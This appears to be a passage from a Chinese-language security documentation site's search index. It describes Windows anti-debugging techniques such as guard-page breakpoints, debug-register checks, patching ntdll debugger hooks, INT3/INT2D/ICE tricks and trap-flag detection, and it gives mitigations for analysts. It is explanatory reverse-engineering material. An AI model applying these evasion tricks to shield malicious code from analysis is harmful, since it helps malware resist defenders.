\u51fd\u6570\u6765\u4fee\u8865\u8fd4\u56de\u5730\u5740\u5904\u7684\u4ee3\u7801\u3002","title":"WriteProcessMemory"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#toolhelp32readprocessmemory","text":"\u51fd\u6570 kernel32!Toolhelp32ReadProcessMemory() \u5141\u8bb8\u60a8\u8bfb\u53d6\u5176\u4ed6\u8fdb\u7a0b\u7684\u5185\u5b58\u3002 \u7136\u800c\uff0c\u5b83\u53ef\u7528\u4e8e\u9632\u8de8\u6b65\u6761\u4ef6\u68c0\u67e5\u3002","title":"Toolhelp32ReadProcessMemory"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_17","text":"\u5185\u5b58\u65ad\u70b9\u662f\u901a\u8fc7\u4f7f\u7528\u4fdd\u62a4\u9875\u6765\u5b9e\u73b0\u7684\uff08\u81f3\u5c11\u5728 OllyDbg \u548c ImmunityDebugger \u4e2d\u5982\u6b64\uff09\u3002 \u4fdd\u62a4\u9875\u4e3a\u5185\u5b58\u9875\u8bbf\u95ee\u63d0\u4f9b\u4e00\u6b21\u6027\u8b66\u62a5\u3002 \u6267\u884c\u4fdd\u62a4\u9875\u65f6\uff0c\u4f1a\u5f15\u53d1\u5f02\u5e38 STATUS_GUARD_PAGE_VIOLATION \u3002 \u53ef\u4ee5\u901a\u8fc7\u5728 kernel32!VirtualAlloc() \u3001 kernel32!VirtualAllocEx() \u3001 kernel32!VirtualProtect() \u548c kernel32!VirtualProtectEx() \u51fd\u6570\u4e2d\u8bbe\u7f6e PAGE_GUARD \u9875\u9762\u4fdd\u62a4\u4fee\u9970\u7b26\u6765\u521b\u5efa\u4fdd\u62a4\u9875\u3002 \u7136\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6ee5\u7528\u8c03\u8bd5\u5668\u5b9e\u73b0\u5185\u5b58\u65ad\u70b9\u7684\u65b9\u5f0f\u6765\u68c0\u67e5\u7a0b\u5e8f\u662f\u5426\u5728\u8c03\u8bd5\u5668\u4e0b\u6267\u884c\u3002 \u6211\u4eec\u53ef\u4ee5\u5206\u914d\u4e00\u4e2a\u53ef\u6267\u884c\u7f13\u51b2\u533a\uff0c\u5176\u4e2d\u4ec5\u5305\u542b\u4e00\u4e2a\u5b57\u8282 0xC3 \uff0c\u5b83\u4ee3\u8868 RET \u6307\u4ee4\u3002 \u7136\u540e\uff0c\u6211\u4eec\u5c06\u6b64\u7f13\u51b2\u533a\u6807\u8bb0\u4e3a\u4fdd\u62a4\u9875\uff0c\u5c06\u5904\u7406\u8c03\u8bd5\u5668\u5b58\u5728\u60c5\u51b5\u7684\u5730\u5740\u63a8\u9001\u5230\u5806\u6808\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u5206\u914d\u7684\u7f13\u51b2\u533a\u3002 \u6307\u4ee4 RET \u5c06\u88ab\u6267\u884c\uff0c\u5982\u679c\u8c03\u8bd5\u5668\uff08OllyDbg \u6216 ImmunityDebugger\uff09\u5b58\u5728\uff0c\u6211\u4eec\u5c06\u5230\u8fbe\u6211\u4eec\u63a8\u9001\u5230\u5806\u6808\u7684\u5730\u5740\u3002 \u5982\u679c\u7a0b\u5e8f\u5728\u6ca1\u6709\u8c03\u8bd5\u5668\u7684\u60c5\u51b5\u4e0b\u6267\u884c\uff0c\u6211\u4eec\u5c06\u8fdb\u5165\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002","title":"\u5185\u5b58\u65ad\u70b9"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_18","text":"\u8c03\u8bd5\u5bc4\u5b58\u5668 DR0\u3001DR1\u3001DR2 \u548c DR3 \u53ef\u4ee5\u4ece\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u68c0\u7d22\u3002 \u5982\u679c\u5b83\u4eec\u5305\u542b\u975e\u96f6\u503c\uff0c\u5219\u53ef\u80fd\u610f\u5473\u7740\u8be5\u8fdb\u7a0b\u662f\u5728\u8c03\u8bd5\u5668\u4e0b\u6267\u884c\u7684\u5e76\u4e14\u8bbe\u7f6e\u4e86\u786c\u4ef6\u65ad\u70b9\u3002","title":"\u786c\u4ef6\u65ad\u70b9"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_19","text":"\u672c\u8282\u5305\u542b\u76f4\u63a5\u68c0\u67e5\u6216\u64cd\u4f5c\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u4ee5\u68c0\u6d4b\u6216\u963b\u6b62\u8c03\u8bd5\u7684\u6280\u672f\u3002","title":"\u5185\u5b58\u68c0\u67e5\u5176\u4ed6\u65b9\u5f0f"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#ntqueryvirtualmemory","text":"\u4ee3\u7801\u6240\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u9875\u5728\u6240\u6709\u8fdb\u7a0b\u4e4b\u95f4\u5171\u4eab\uff0c\u76f4\u5230\u5199\u5165\u4e00\u4e2a\u9875\u3002 \u4e4b\u540e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u590d\u5236\u8be5\u9875\u9762\u5e76\u5c06\u5176\u6620\u5c04\u5230\u8fdb\u7a0b\u865a\u62df\u5185\u5b58\uff0c\u56e0\u6b64\u8be5\u9875\u9762\u4e0d\u518d\u201c\u5171\u4eab\u201d\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u67e5\u8be2\u5f53\u524d\u8fdb\u7a0b\u7684Working Set\uff0c\u67e5\u770b\u5e26\u6709\u4ee3\u7801\u7684\u9875\u9762\u7684Working Set Block\u7684Shared\u548cShareCount\u5b57\u6bb5\u3002 \u5982\u679c\u4ee3\u7801\u4e2d\u6709\u8f6f\u4ef6\u65ad\u70b9\uff0c\u5219\u4e0d\u5f97\u8bbe\u7f6e\u8fd9\u4e9b\u5b57\u6bb5\u3002","title":"NtQueryVirtualMemory"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#detecting-a-function-patch","text":"\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u4e00\u79cd\u6d41\u884c\u65b9\u6cd5\u662f\u8c03\u7528 kernel32!IsDebuggerPresent() \u3002 \u51cf\u8f7b\u8fd9\u79cd\u68c0\u67e5\u5f88\u7b80\u5355\uff0c\u4f8b\u5982 \u66f4\u6539 EAX \u5bc4\u5b58\u5668\u4e2d\u7684\u7ed3\u679c\u6216\u4fee\u8865 kernel32!IsDebuggerPresent() \u51fd\u6570\u7684\u4ee3\u7801\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u9a8c\u8bc1 kernel32!IsDebuggerPresent() \u662f\u5426\u88ab\u4fee\u6539\uff0c\u800c\u4e0d\u662f\u68c0\u67e5\u8fdb\u7a0b\u5185\u5b58\u4e2d\u7684\u65ad\u70b9\u3002 \u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u8be5\u51fd\u6570\u7684\u524d\u51e0\u4e2a\u5b57\u8282\uff0c\u5e76\u5c06\u5b83\u4eec\u4e0e\u5176\u4ed6\u8fdb\u7a0b\u4e2d\u540c\u4e00\u51fd\u6570\u7684\u8fd9\u4e9b\u5b57\u8282\u8fdb\u884c\u6bd4\u8f83\u3002 \u5373\u4f7f\u542f\u7528\u4e86 ASLR\uff0cWindows \u5e93\u4e5f\u4f1a\u52a0\u8f7d\u5230\u6240\u6709\u8fdb\u7a0b\u4e2d\u7684\u76f8\u540c\u57fa\u5730\u5740\u3002 \u57fa\u5730\u5740\u4ec5\u5728\u91cd\u65b0\u542f\u52a8\u540e\u624d\u4f1a\u66f4\u6539\uff0c\u4f46\u5bf9\u4e8e\u6240\u6709\u8fdb\u7a0b\uff0c\u5b83\u4eec\u5728\u4f1a\u8bdd\u671f\u95f4\u5c06\u4fdd\u6301\u4e0d\u53d8\u3002","title":"Detecting a function patch"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#patch-ntdlldbgbreakpoint","text":"\u5f53\u8c03\u8bd5\u5668\u9644\u52a0\u5230\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u65f6\u8c03\u7528\u5b83\u3002 \u5b83\u5141\u8bb8\u8c03\u8bd5\u5668\u83b7\u5f97\u63a7\u5236\u6743\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u62e6\u622a\u5f15\u53d1\u7684\u5f02\u5e38\u3002 \u5982\u679c\u6211\u4eec\u5220\u9664 ntdll!DbgBreakPoint() \u5185\u7684\u65ad\u70b9\uff0c\u8c03\u8bd5\u5668\u5c06\u4e0d\u4f1a\u4e2d\u65ad\u5e76\u4e14\u7ebf\u7a0b\u5c06\u9000\u51fa\u3002","title":"Patch ntdll!DbgBreakPoint"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#patch-ntdlldbguiremotebreakin","text":"\u5f53\u8c03\u8bd5\u5668\u8c03\u7528 kernel32!DebugActiveProcess() \u65f6\uff0c\u76f8\u5e94\u5730\u8c03\u7528 ntdll!DbgUiRemoteBreakin() \u3002 \u4e3a\u4e86\u9632\u6b62\u8c03\u8bd5\u5668Attach\u5230\u8fdb\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u8865 ntdll!DbgUiRemoteBreakin() \u4ee3\u7801\u4ee5\u8c03\u7528 kernel32!TerminateProcess() \u3002","title":"Patch ntdll!DbgUiRemoteBreakin"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_20","text":"\u9a8c\u8bc1\u4ee3\u7801\u6821\u9a8c\u548c\u662f\u68c0\u6d4b\u8f6f\u4ef6\u65ad\u70b9\u3001\u8c03\u8bd5\u5668\u7684\u5355\u6b65\u6267\u884c\u3001\u51fd\u6570\u7684\u5185\u8054\u6302\u94a9\u6216\u6570\u636e\u4fee\u6539\u7684\u53ef\u9760\u65b9\u6cd5\u3002","title":"\u6267\u884c\u4ee3\u7801\u6821\u9a8c\u548c"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_21","text":"\u8c03\u8bd5\u65f6\uff1a - \u5bf9\u4e8e\u9632\u8de8\u6b65\uff1a\u5355\u6b65\u6267\u884c\u6267\u884c Step-Over \u68c0\u67e5\u7684\u51fd\u6570\u5e76\u6267\u884c\u5230\u6700\u540e\uff08OllyDbg/x32/x64dbg \u4e2d\u4e3a Ctrl+F9\uff09\u3002 - \u7f13\u89e3\u6240\u6709\u201c\u5185\u5b58\u201d\u6280\u5de7\uff08\u5305\u62ec Anti-Step-Over\uff09\u7684\u6700\u4f73\u65b9\u6cd5\u662f\u627e\u5230\u7cbe\u786e\u7684\u68c0\u67e5\u5e76\u4f7f\u7528 NOP \u5bf9\u5176\u8fdb\u884c\u4fee\u8865\uff0c\u6216\u8005\u8bbe\u7f6e\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u8fdb\u4e00\u6b65\u6267\u884c\u7684\u8fd4\u56de\u503c\u3002","title":"\u7ed3\u8bba"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_22","text":"\u4ee5\u4e0b\u6280\u672f\u65e8\u5728\u6839\u636e CPU \u6267\u884c\u7279\u5b9a\u6307\u4ee4\u65f6\u8c03\u8bd5\u5668\u7684\u884c\u4e3a\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728\u3002","title":"\u6c47\u7f16\u6307\u4ee4"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#int-3","text":"\u6307\u4ee4INT3\u662f\u4e00\u4e2a\u4e2d\u65ad\uff0c\u7528\u4f5c\u8f6f\u4ef6\u65ad\u70b9\u3002 \u5982\u679c\u6ca1\u6709\u8c03\u8bd5\u5668\uff0c\u5219\u5728\u5230\u8fbe INT3 \u6307\u4ee4\u540e\uff0c\u4f1a\u751f\u6210\u5f02\u5e38 EXCEPTION_BREAKPOINT (0x80000003) \uff0c\u5e76\u8c03\u7528\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 \u5982\u679c\u8c03\u8bd5\u5668\u5b58\u5728\uff0c\u5219\u63a7\u5236\u6743\u4e0d\u4f1a\u4ea4\u7ed9\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 \u9664\u4e86 INT3 \u6307\u4ee4\u7684\u77ed\u5f62\u5f0f\uff080xCC \u64cd\u4f5c\u7801\uff09\u5916\uff0c\u8be5\u6307\u4ee4\u8fd8\u6709\u957f\u5f62\u5f0f\uff1aCD 03 \u64cd\u4f5c\u7801\u3002 \u5f53\u5f02\u5e38 EXCEPTION_BREAKPOINT \u53d1\u751f\u65f6\uff0cWindows \u5c06 EIP \u5bc4\u5b58\u5668\u9012\u51cf\u5230 0xCC \u64cd\u4f5c\u7801\u7684\u5047\u5b9a\u4f4d\u7f6e\uff0c\u5e76\u5c06\u63a7\u5236\u6743\u4f20\u9012\u7ed9\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 \u5bf9\u4e8e\u957f\u5f62\u5f0f\u7684 INT3 \u6307\u4ee4\uff0cEIP \u5c06\u6307\u5411\u6307\u4ee4\u7684\u4e2d\u95f4\uff08\u5373 0x03 \u5b57\u8282\uff09\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u60f3\u5728 INT3 \u6307\u4ee4\u4e4b\u540e\u7ee7\u7eed\u6267\u884c\uff0c\u5e94\u8be5\u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4e2d\u7f16\u8f91 EIP\uff08\u5426\u5219\u6211\u4eec\u5f88\u53ef\u80fd\u4f1a\u5f97\u5230 EXCEPTION_ACCESS_VIOLATION \u5f02\u5e38\uff09\u3002 \u5982\u679c\u6ca1\u6709\uff0c\u6211\u4eec\u53ef\u4ee5\u5ffd\u7565\u6307\u4ee4\u6307\u9488\u7684\u4fee\u6539\u3002","title":"INT 3"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#int-2d","text":"\u5c31\u50cf INT3 \u6307\u4ee4\u7684\u60c5\u51b5\u4e00\u6837\uff0c\u5f53\u6267\u884c INT2D \u6307\u4ee4\u65f6\uff0c\u4e5f\u4f1a\u5f15\u53d1\u5f02\u5e38 EXCEPTION_BREAKPOINT \u3002 \u4f46\u5bf9\u4e8e INT 2D\uff0cWindows \u4f7f\u7528 EIP \u5bc4\u5b58\u5668\u4f5c\u4e3a\u5f02\u5e38\u5730\u5740\uff0c\u7136\u540e\u9012\u589e EIP \u5bc4\u5b58\u5668\u503c\u3002 \u5728\u6267\u884c INT 2D \u65f6\uff0cWindows \u8fd8\u4f1a\u68c0\u67e5 EAX \u5bc4\u5b58\u5668\u7684\u503c\u3002 \u5982\u679c\u5728\u6240\u6709\u7248\u672c\u7684 Windows \u4e0a\u4e3a 1\u30013 \u6216 4\uff0c\u6216\u8005\u5728 Vista+ \u4e0a\u4e3a 5\uff0c\u5219\u5f02\u5e38\u5730\u5740\u5c06\u52a0 1\u3002 \u8be5\u6307\u4ee4\u53ef\u80fd\u4f1a\u7ed9\u67d0\u4e9b\u8c03\u8bd5\u5668\u5e26\u6765\u95ee\u9898\uff0c\u56e0\u4e3a\u5728 EIP \u653b\u51fb\u540e\uff0cINT2D \u6307\u4ee4\u540e\u9762\u7684\u5b57\u8282\u5c06\u88ab\u8df3\u8fc7\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u4ece\u635f\u574f\u7684\u6307\u4ee4\u7ee7\u7eed\u6267\u884c\u3002 \u5728\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u5728 INT 2D \u4e4b\u540e\u653e\u7f6e\u4e00\u5b57\u8282 NOP \u6307\u4ee4\uff0c\u4ee5\u4fbf\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u8df3\u8fc7\u5b83\u3002 \u5982\u679c\u7a0b\u5e8f\u5728\u6ca1\u6709\u8c03\u8bd5\u5668\u7684\u60c5\u51b5\u4e0b\u6267\u884c\uff0c\u63a7\u5236\u6743\u5c06\u88ab\u4f20\u9012\u7ed9\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002","title":"INT 2D"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#debugbreak","text":"\u6b63\u5982 DebugBreak \u6587\u6863\u4e2d\u6240\u5199\uff0c\u201cDebugBreak \u4f1a\u5bfc\u81f4\u5f53\u524d\u8fdb\u7a0b\u53d1\u751f\u65ad\u70b9\u5f02\u5e38\u3002 \u8fd9\u5141\u8bb8\u8c03\u7528\u7ebf\u7a0b\u5411\u8c03\u8bd5\u5668\u53d1\u51fa\u4fe1\u53f7\u4ee5\u5904\u7406\u5f02\u5e38\u201d\u3002 \u5982\u679c\u7a0b\u5e8f\u5728\u6ca1\u6709\u8c03\u8bd5\u5668\u7684\u60c5\u51b5\u4e0b\u6267\u884c\uff0c\u63a7\u5236\u6743\u5c06\u88ab\u4f20\u9012\u7ed9\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 \u5426\u5219\uff0c\u6267\u884c\u5c06\u88ab\u8c03\u8bd5\u5668\u62e6\u622a\u3002","title":"DebugBreak"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#ice","text":"\u201cICE\u201d\u662f\u82f1\u7279\u5c14\u672a\u8bb0\u5f55\u7684\u6307\u4ee4\u4e4b\u4e00\u3002 \u5176\u64cd\u4f5c\u7801\u662f0xF1\u3002 \u5b83\u53ef\u4ee5\u7528\u6765\u68c0\u6d4b\u7a0b\u5e8f\u662f\u5426\u88ab\u8ddf\u8e2a\u3002 \u5982\u679c\u6267\u884c ICE \u6307\u4ee4\uff0c\u5c06\u5f15\u53d1 EXCEPTION_SINGLE_STEP (0x80000004) \u5f02\u5e38\u3002 \u7136\u800c\uff0c\u5982\u679c\u7a0b\u5e8f\u5df2\u7ecf\u88ab\u8ddf\u8e2a\uff0c\u8c03\u8bd5\u5668\u5c06\u8ba4\u4e3a\u8be5\u5f02\u5e38\u662f\u901a\u8fc7\u6267\u884c\u6807\u5fd7\u5bc4\u5b58\u5668\u4e2d\u8bbe\u7f6e\u4e86 SingleStep \u4f4d\u7684\u6307\u4ee4\u800c\u751f\u6210\u7684\u6b63\u5e38\u5f02\u5e38\u3002 \u56e0\u6b64\uff0c\u5728\u8c03\u8bd5\u5668\u4e0b\uff0c\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4e0d\u4f1a\u88ab\u8c03\u7528\uff0c\u5e76\u4e14\u4f1a\u5728 ICE \u6307\u4ee4\u4e4b\u540e\u7ee7\u7eed\u6267\u884c\u3002","title":"ICE"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_23","text":"\u8fd9\u662f\u4e00\u4e2a\u53ef\u4ee5\u7528\u6765\u68c0\u6d4b\u7a0b\u5e8f\u662f\u5426\u88ab\u8ddf\u8e2a\u7684\u6280\u5de7\u3002 \u8be5\u6280\u5de7\u5305\u62ec\u8ddf\u8e2a\u4ee5\u4e0b\u6c47\u7f16\u6307\u4ee4\u5e8f\u5217\uff1a push ss pop ss pushf \u901a\u8fc7\u6b64\u4ee3\u7801\u5728\u8c03\u8bd5\u5668\u4e2d\u5355\u6b65\u6267\u884c\u540e\uff0c\u5c06\u8bbe\u7f6e\u9677\u9631\u6807\u5fd7\u3002 \u901a\u5e38\u5b83\u662f\u4e0d\u53ef\u89c1\u7684\uff0c\u56e0\u4e3a\u8c03\u8bd5\u5668\u5728\u6bcf\u4e2a\u8c03\u8bd5\u5668\u4e8b\u4ef6\u4f20\u9012\u540e\u90fd\u4f1a\u6e05\u9664\u9677\u9631\u6807\u5fd7\u3002 \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u4e4b\u524d\u5c06 EFLAGS \u4fdd\u5b58\u5230\u5806\u6808\u4e2d\uff0c\u6211\u4eec\u5c06\u80fd\u591f\u68c0\u67e5\u9677\u9631\u6807\u5fd7\u662f\u5426\u5df2\u8bbe\u7f6e\u3002","title":"\u6808\u5e27\u5bc4\u5b58\u5668"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_24","text":"\u8fd9\u79cd\u6280\u672f\u6ee5\u7528\u4e86\u4e00\u4e9b\u8c03\u8bd5\u5668\u5904\u7406 EXCEPTION_SINGLE_STEP \u5f02\u5e38\u7684\u65b9\u5f0f\u3002 \u8fd9\u4e2a\u6280\u5de7\u7684\u60f3\u6cd5\u662f\u6309\u7167\u67d0\u4e2a\u9884\u5b9a\u4e49\u7684\u5e8f\u5217\uff08\u4f8b\u5982 NOP \u5e8f\u5217\uff09\u4e3a\u6bcf\u6761\u6307\u4ee4\u8bbe\u7f6e\u786c\u4ef6\u65ad\u70b9\u3002 \u6267\u884c\u5e26\u6709\u786c\u4ef6\u65ad\u70b9\u7684\u6307\u4ee4\u4f1a\u5f15\u53d1 EXCEPTION_SINGLE_STEP \u5f02\u5e38\uff0c\u8be5\u5f02\u5e38\u53ef\u4ee5\u7531\u5411\u91cf\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u6355\u83b7\u3002 \u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u589e\u52a0\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u8be5\u5bc4\u5b58\u5668\u5145\u5f53\u6307\u4ee4\u8ba1\u6570\u5668\uff08\u5728\u672c\u4f8b\u4e2d\u4e3a EAX\uff09\u548c\u6307\u4ee4\u6307\u9488 EIP\uff0c\u4ee5\u5c06\u63a7\u5236\u6743\u4f20\u9012\u7ed9\u5e8f\u5217\u4e2d\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u3002 \u56e0\u6b64\uff0c\u6bcf\u6b21\u5c06\u63a7\u5236\u6743\u4f20\u9012\u5230\u5e8f\u5217\u4e2d\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u65f6\uff0c\u90fd\u4f1a\u5f15\u53d1\u5f02\u5e38\u5e76\u4e14\u8ba1\u6570\u5668\u4f1a\u9012\u589e\u3002 \u5e8f\u5217\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u68c0\u67e5\u8ba1\u6570\u5668\uff0c\u5982\u679c\u5b83\u4e0d\u7b49\u4e8e\u5e8f\u5217\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u5c31\u8ba4\u4e3a\u7a0b\u5e8f\u6b63\u5728\u8c03\u8bd5\u3002","title":"\u6307\u4ee4\u8ba1\u6570"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#popf-and-trap-flag","text":"\u8fd9\u662f\u53e6\u4e00\u4e2a\u53ef\u4ee5\u6307\u793a\u7a0b\u5e8f\u662f\u5426\u6b63\u5728\u88ab\u8ddf\u8e2a\u7684\u6280\u5de7\u3002 \u6807\u5fd7\u5bc4\u5b58\u5668\u4e2d\u6709\u4e00\u4e2a\u9677\u9631\u6807\u5fd7\u3002 \u8bbe\u7f6e\u9677\u9631\u6807\u5fd7\u540e\uff0c\u5c06\u5f15\u53d1\u5f02\u5e38 SINGLE_STEP \u3002 \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u8ddf\u8e2a\u4ee3\u7801\uff0c\u9677\u9631\u6807\u5fd7\u5c06\u88ab\u8c03\u8bd5\u5668\u6e05\u9664\uff0c\u56e0\u6b64\u6211\u4eec\u4e0d\u4f1a\u770b\u5230\u5f02\u5e38\u3002","title":"POPF and Trap Flag"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_25","text":"\u6b64\u6280\u5de7\u4ec5\u5728\u67d0\u4e9b\u8c03\u8bd5\u5668\u4e2d\u6709\u6548\u3002 \u5b83\u6ee5\u7528\u4e86\u8fd9\u4e9b\u8c03\u8bd5\u5668\u5904\u7406\u6307\u4ee4\u524d\u7f00\u7684\u65b9\u5f0f\u3002 \u5982\u679c\u6211\u4eec\u5728 OllyDbg \u4e2d\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\uff0c\u5728\u5355\u6b65\u6267\u884c\u5230\u7b2c\u4e00\u4e2a\u5b57\u8282 F3 \u540e\uff0c\u6211\u4eec\u5c06\u7acb\u5373\u5230\u8fbe try \u5757\u7684\u672b\u5c3e\u3002 \u8c03\u8bd5\u5668\u53ea\u662f\u8df3\u8fc7\u524d\u7f00\u5e76\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9 INT1 \u6307\u4ee4\u3002 \u5982\u679c\u6211\u4eec\u5728\u6ca1\u6709\u8c03\u8bd5\u5668\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u76f8\u540c\u7684\u4ee3\u7801\uff0c\u5219\u4f1a\u5f15\u53d1\u5f02\u5e38\uff0c\u5e76\u4e14\u6211\u4eec\u5c06\u8fdb\u5165 except \u5757\u3002","title":"\u6307\u4ee4\u524d\u7f00"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_26","text":"\u8c03\u8bd5\u65f6\uff1a \u7f13\u89e3\u4ee5\u4e0b\u6240\u6709\u68c0\u67e5\u7684\u6700\u4f73\u65b9\u6cd5\u662f\u4f7f\u7528 NOP \u6307\u4ee4\u4fee\u8865\u5b83\u4eec\u3002 \u5173\u4e8e\u53cd\u8ddf\u8e2a\u6280\u672f\uff1a\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5730\u5728\u68c0\u67e5\u540e\u7684\u4ee3\u7801\u4e2d\u8bbe\u7f6e\u4e00\u4e2a\u65ad\u70b9\uff0c\u7136\u540e\u8fd0\u884c\u7a0b\u5e8f\u76f4\u5230\u8be5\u65ad\u70b9\uff0c\u800c\u4e0d\u662f\u4fee\u8865\u4ee3\u7801\u3002","title":"\u7ed3\u8bba"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_27","text":"\u4ee5\u4e0b\u6280\u672f\u4f7f\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u53ef\u4ee5\u7ba1\u7406\u7528\u6237\u754c\u9762\u6216\u4e0e\u5176\u7236\u8fdb\u7a0b\u4ea4\u4e92\uff0c\u4ee5\u53d1\u73b0\u5df2\u8c03\u8bd5\u8fdb\u7a0b\u56fa\u6709\u7684\u4e0d\u4e00\u81f4\u4e4b\u5904\u3002","title":"\u4ea4\u4e92\u5f0f\u68c0\u67e5"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_28","text":"\u81f3\u5c11\u6709\u4e09\u4e2a\u51fd\u6570\u53ef\u7528\u4e8e\u4f5c\u4e3a\u8c03\u8bd5\u5668\u9644\u52a0\u5230\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\uff1a - kernel32!DebugActiveProcess() - ntdll!DbgUiDebugActiveProcess() - ntdll!NtDebugActiveProcess() 